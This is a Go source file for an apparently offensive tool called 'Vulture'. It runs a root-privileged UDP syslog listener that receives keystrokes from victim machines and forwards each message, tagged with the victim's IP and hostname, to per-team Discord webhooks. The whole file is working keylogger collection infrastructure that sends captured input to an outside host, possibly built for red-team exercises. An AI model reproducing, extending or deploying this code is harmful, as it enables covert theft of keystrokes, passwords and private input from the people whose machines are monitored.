package main

import (
	"flag"
	"fmt"
	"log"
	"os"
	"strings"

	"github.com/aiomonitors/godiscord"
	"github.com/joho/godotenv"
	"gopkg.in/mcuadros/go-syslog.v2"
	"gopkg.in/mcuadros/go-syslog.v2/format"
)

var asciiArt string = `

██▒   █▓ █    ██  ██▓  ▄▄▄█████▓ █    ██  ██▀███  ▓█████ 
▓██░   █▒ ██  ▓██▒▓██▒  ▓  ██▒ ▓▒ ██  ▓██▒▓██ ▒ ██▒▓█   ▀ 
 ▓██  █▒░▓██  ▒██░▒██░  ▒ ▓██░ ▒░▓██  ▒██░▓██ ░▄█ ▒▒███   
  ▒██ █░░▓▓█  ░██░▒██░  ░ ▓██▓ ░ ▓▓█  ░██░▒██▀▀█▄  ▒▓█  ▄ 
   ▒▀█░  ▒▒█████▓ ░██████▒▒██▒ ░ ▒▒█████▓ ░██▓ ▒██▒░▒████▒
   ░ ▐░  ░▒▓▒ ▒ ▒ ░ ▒░▓  ░▒ ░░   ░▒▓▒ ▒ ▒ ░ ▒▓ ░▒▓░░░ ▒░ ░
   ░ ░░  ░░▒░ ░ ░ ░ ░ ▒  ░  ░    ░░▒░ ░ ░   ░▒ ░ ▒░ ░ ░  ░
     ░░   ░░░ ░ ░   ░ ░   ░       ░░░ ░ ░   ░░   ░    ░   
      ░     ░         ░  ░          ░        ░        ░  ░
     ░                                                    

`

var syslogServerIP *string
var syslogServerPort *string

func main() {

	if os.Geteuid() != 0 {
		log.Fatal("Needs to be run as root")
	}

	// Load command flags
	syslogServerIP = flag.String("s", "0.0.0.0", "Server IP")
	syslogServerPort = flag.String("p", "80", "Server port")
	flag.Parse()

	fmt.Println(asciiArt)

	syslogSocket := *syslogServerIP + ":" + *syslogServerPort

	channel := make(syslog.LogPartsChannel)
	handler := syslog.NewChannelHandler(channel)

	// Start the syslog server
	server := syslog.NewServer()
	server.SetFormat(syslog.Automatic)
	server.SetHandler(handler)
	server.ListenUDP(syslogSocket)
	server.Boot()

	// Message event handler
	func(channel syslog.LogPartsChannel) {

		fmt.Println("[+] Listening for keystrokes")
		for logParts := range channel {
			fmt.Println(logParts)
			go sendToDiscord(logParts)
		}
	}(channel)
}

func sendToDiscord(syslogMessage format.LogParts) {

	// Refresh the webhook URL's
	err := godotenv.Load(".teams")
	if err != nil {
		log.Fatalf("Error loading .teams file")
	}

	// Get relevant fields from the syslog message
	teamNum := "TEAM" + fmt.Sprint(syslogMessage["tag"])
	victimSocket := strings.Split(fmt.Sprint(syslogMessage["hostname"]), "/")
	victimHostname := victimSocket[0]
	victimIp := victimSocket[1]
	message := fmt.Sprint(syslogMessage["content"])

	// Assemble the Discord embed
	embed := godiscord.NewEmbed(message, "", "")
	embed.AddField("Victim IP", victimIp, true)
	embed.AddField("Hostname", victimHostname, true)
	embed.SetColor("#00FF00")
	embed.AvatarURL = "https://w0.peakpx.com/wallpaper/714/638/HD-wallpaper-green-skull-skull-artist-artwork-digital-art-dark-black.jpg"

	// If the team exists, send a webhook
	if os.Getenv(teamNum) != "" {
		err = embed.SendToWebhook(os.Getenv(teamNum))
		if err != nil {
			fmt.Println(err)
		}
	} else {
		fmt.Println("Error, " + teamNum + " does not exist")
	}
}
